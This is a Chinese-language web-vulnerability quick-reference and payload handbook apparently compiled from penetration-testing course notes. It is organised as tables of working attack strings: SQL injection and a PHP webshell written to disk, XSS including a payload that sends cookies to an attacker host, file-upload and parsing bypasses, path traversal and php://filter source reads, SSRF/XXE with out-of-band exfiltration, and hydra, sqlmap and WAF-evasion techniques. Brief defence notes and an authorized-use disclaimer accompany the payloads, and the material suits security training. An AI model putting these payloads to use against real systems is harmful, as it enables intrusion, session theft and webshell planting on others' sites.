Web 漏洞速查与 Payload 手册

由渗透测试课程笔记提炼的 Web 漏洞速查手册：每个漏洞一张表，原理一句话 + 核心 Payload + 防御。面试和实战随手翻。

★重点 所有 Payload 仅限自有靶场/授权测试使用。

一、SQL 注入

★重点 面试高频 原理：后端把用户输入直接拼接进 SQL 语句执行。

类型 核心 Payload 要点
字符型 ' or 1=1 # 闭合引号，# 注释掉后面
数字型 and 1=1 / and 1=2 无需闭合引号，逻辑配对判断
搜索型 %' or 1=1 # 闭合 LIKE 的 % 和引号
联合查询 -1' union select 1,2,3 # order by 测列数，回显位换查询
报错注入 and updatexml(1,concat(0x7e,database(),0x7e),1) 无回显有报错时首选，单次 32 字符
布尔盲注 and length(database())>3 页面正常/异常判断
时间盲注 and sleep(5) 响应延迟判断
写 Shell union select 1,'<?php @eval($_POST[x]);?>' into outfile '路径' 需 secure_file_priv 开放+绝对路径+写权限

脱库固定流程：version() / user() / database() → information_schema.tables 爆表 → columns 爆字段 → limit 逐行取数据。

工具：sqlmap -u "目标?id=1" --dbs，带登录态用 -r 请求文件，过 WAF 用 --tamper。

防御：参数化查询（预编译）是唯一根治方案；最小权限、屏蔽报错、WAF 兜底。

二、XSS 跨站脚本

面试高频 三类：存储型（入库持久/高危）、反射型（URL 一次性）、DOM 型（前端动态渲染）。

场景 Payload
文本内输出 <script>alert(1)</script>
图片事件（自动触发） <img src=x onerror=alert(1)>
SVG（自动触发） <svg onload=alert(1)>
属性内输出 ' onclick=alert(1) >（引号闭合+事件注入）
URL 伪协议 <a href="javascript:alert(1)">点我</a>
窃取 Cookie <img src=x onerror="new Image().src='http://攻击者/log?c='+document.cookie">

★重点 防御：输入过滤 + 输出转义双端；拿到管理员会话 = 拿下后台。

三、文件上传与解析

防护 绕过 Payload/手法
前端 JS 校验 删 JS / 抓包改包（shell.png → shell.php）
MIME 校验 抓包改 Content-Type: image/jpeg
文件头校验 copy /b 图片.jpg + 木马.php 图片马.jpg
后缀黑名单 大小写 pHp、双写 pphphp、shell.php.、%00 截断
图片马执行 配合解析漏洞/文件包含（/shell.jpg/1.php）

解析漏洞速记：IIS6 分号截断 shell.asp;.jpg；Apache 多后缀 shell.php.xxx；Nginx cgi.fix_pathinfo=1 + 图片马。

文件包含：路径可控直接 ?page=../../../../etc/passwd；读源码用 php://filter/read=convert.base64-encode/resource=index.php。

四、命令执行 / 反序列化

面试高频 PHP 危险函数：

类别 函数
命令执行 system / exec / shell_exec / 反引号 / popen
代码执行 eval / assert / preg_replace /e

命令连接符：;（无条件）、&&（成功才执行）、||（失败才执行）、|（管道）。

反序列化：用户可控序列化字符串被直接 unserialize()，触发魔术方法 __construct / __destruct 执行代码。重点组件：WebLogic、Shiro、Fastjson、Apache Commons。

防御：不反序列化不可信数据；类白名单；升级组件；disable_functions。

五、SSRF / XXE

漏洞 核心 Payload 利用
SSRF url=http://127.0.0.1:80、file:///etc/passwd、dict://ip:3306 内网探测、读文件
XXE <!ENTITY xxe SYSTEM "file:///etc/passwd"> 读文件、内网请求
XXE 无回显 实体外带到 http://攻击者/?p=%file; 日志/DNSLog 接收

SSRF 绕过：进制转换（0xC0A80116）、IP 简写（10.1）、@ 解析（http://白名单域名@内网IP）。

防御：URL 白名单、协议白名单、过滤内网 IP；XXE 禁用外部实体（PHP libxml_disable_entity_loader(true)）。

六、越权 / 逻辑 / 爆破

★重点 越权三兄弟：未授权访问（不登录直访）、水平越权（改 ID 看别人数据）、垂直越权（换身份执行管理员操作）。

测试法：两个账号抓包 → 找到身份标识（Cookie/UID/SID）→ 替换 → 放包看结果。

逻辑漏洞：支付改价、状态参数篡改（F=0→1）、积分篡改、验证码爆破、短信轰炸——扫描器扫不出，只能手工。

爆破：hydra -L users.txt -P pass.txt ssh://目标；Web 表单用 Burp Intruder；验证码前端删 JS、后端吃时效；Token 从响应中递归提取。

七、WAF 绕过

面试高频 识别（wafw00f）→ 绕过：

组合技：URL 编码 + 双重编码 + 分块传输（Chunked）+ 换请求位置（GET→POST→Cookie）。

★重点 一句话记忆：有回显联合查，有报错 updatexml，无回显上盲注；上传图片马配解析/包含；WAF 规则匹配不到=放行。
